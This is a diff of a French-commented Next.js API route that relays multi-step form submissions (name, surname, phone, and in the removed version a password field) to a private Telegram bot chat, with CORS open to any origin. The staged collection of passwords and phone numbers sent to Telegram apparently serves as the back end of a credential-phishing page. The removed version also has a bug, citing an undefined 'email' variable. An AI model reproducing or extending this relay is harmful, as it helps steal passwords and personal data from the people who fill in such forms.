@@ -1,117 +1,58 @@
-// /pages/api/webhook.js
-// Next.js API route style. Gère CORS pour développement local.
-// IMPORTANT: définis TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID en variable d'env.
-
-async function getFetch() {
-  if (typeof fetch !== "undefined") return fetch;
-  try {
-    const nodeFetch = await import("node-fetch");
-    return nodeFetch.default;
-  } catch (e) {
-    throw new Error("fetch non disponible. Installez node-fetch ou utilisez Node >=18.");
-  }
-}
-
-function escapeHtml(str = "") {
-  return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
-}
-
-function corsHeaders(req) {
-  // Tu peux définir CORS_ORIGIN dans tes env (ex: http://localhost:3000)
-  const allowed = process.env.CORS_ORIGIN || "*";
-  return {
-    "Access-Control-Allow-Origin": allowed,
-    "Access-Control-Allow-Methods": "POST, OPTIONS",
-    "Access-Control-Allow-Headers": "Content-Type",
-  };
-}
-
+// pages/api/webhook.js
 export default async function handler(req, res) {
-  // Répondre aux preflight CORS
+  // Autorisations CORS (pour ton localhost et Netlify)
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+
   if (req.method === "OPTIONS") {
-    const headers = corsHeaders(req);
-    res.setHeader("Access-Control-Allow-Origin", headers["Access-Control-Allow-Origin"]);
-    res.setHeader("Access-Control-Allow-Methods", headers["Access-Control-Allow-Methods"]);
-    res.setHeader("Access-Control-Allow-Headers", headers["Access-Control-Allow-Headers"]);
-    return res.status(204).end();
+    return res.status(200).end(); // Réponse au preflight
   }
 
-  // Autoriser seulement POST pour l'API réelle
   if (req.method !== "POST") {
-    res.setHeader("Allow", "POST, OPTIONS");
-    const headers = corsHeaders(req);
-    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
     return res.status(405).json({ error: "Méthode non autorisée" });
   }
 
-  const fetchFn = await getFetch();
-
   try {
-    const body = req.body;
-    const data = typeof body === "string" ? JSON.parse(body) : body;
-    const { type, payload } = data || {};
+    const { type, payload } = req.body || {};
 
-    if (!type || !payload || typeof payload !== "object") {
-      const headers = corsHeaders(req);
-      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
-      return res.status(400).json({ error: "Payload invalide" });
+    if (!type || !payload) {
+      return res.status(400).json({ error: "Requête invalide : { type, payload } attendu" });
     }
 
-    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    if (!token || !chatId) {
-      console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars");
-      const headers = corsHeaders(req);
-      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
-      return res.status(500).json({ error: "Configuration serveur manquante" });
+    if (!botToken || !chatId) {
+      return res.status(500).json({ error: "Configuration Telegram manquante" });
     }
 
-    // Compose message
+    // Construire le message selon le type
     let text = "";
     if (type === "contact_info") {
-      const name = escapeHtml(payload.name || "—");
-      const motDePasse = escapeHtml(payload.motDePasse || "—");
-      text = `<b>📨 Nouveau contact (étape 1)</b>\n\n<b>Nom :</b> ${name}\n<b>Email :</b> ${email}`;
-    } else if (type === "message") {
-      const name = escapeHtml(payload.name || "—");
-      const phone = escapeHtml(payload.phone || "—");
-      text = `<b>💬 Message reçu (étape 2)</b>\n\n<b>Nom :</b> ${name}\n<b>Message :</b>\n${phone}`;
+      text = `📨 Étape 1 — Coordonnées\n\n👤 Nom : ${payload.nom}\n👤 Prénom : ${payload.prenom}`;
+    } else if (type === "phone") {
+      text = `📱 Étape 2 — Téléphone\n\nNuméro : ${payload.phone}`;
     } else {
-      const headers = corsHeaders(req);
-      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
-      return res.status(400).json({ error: "Type inconnu" });
+      return res.status(400).json({ error: "Type inconnu. Utilisez contact_info ou phone." });
     }
 
-    const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
-    const tgResp = await fetchFn(tgUrl, {
+    // Envoi à Telegram
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(telegramUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true,
-      }),
+      body: JSON.stringify({ chat_id: chatId, text }),
     });
 
-    const tgJson = await tgResp.json();
-    const headers = corsHeaders(req);
-    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
-
-    if (!tgJson.ok) {
-      console.error("Telegram error:", tgJson);
-      return res.status(502).json({ error: "Erreur côté Telegram", details: tgJson });
+    if (!response.ok) {
+      const errText = await response.text();
+      return res.status(500).json({ error: "Erreur Telegram", details: errText });
     }
 
-    return res.status(200).json({ ok: true, result: tgJson.result });
+    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
   } catch (err) {
     console.error("Erreur webhook:", err);
-    const headers = corsHeaders(req);
-    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
     return res.status(500).json({ error: "Erreur serveur", details: err.message });
   }
 }
